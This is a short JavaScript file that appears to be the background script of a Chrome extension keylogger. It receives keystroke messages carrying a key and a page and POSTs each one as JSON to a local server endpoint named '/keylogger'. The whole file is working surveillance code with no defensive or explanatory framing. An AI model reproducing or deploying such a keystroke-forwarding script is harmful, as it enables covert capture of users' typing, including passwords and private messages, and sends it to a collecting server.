function handleMessage(request) {
    var xhr = new XMLHttpRequest();
    var url = "http://127.0.0.1:5000/keylogger";
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    var data = JSON.stringify({"key": request.key, "page": request.page});
    xhr.send(data);

}

chrome.runtime.onMessage.addListener(handleMessage);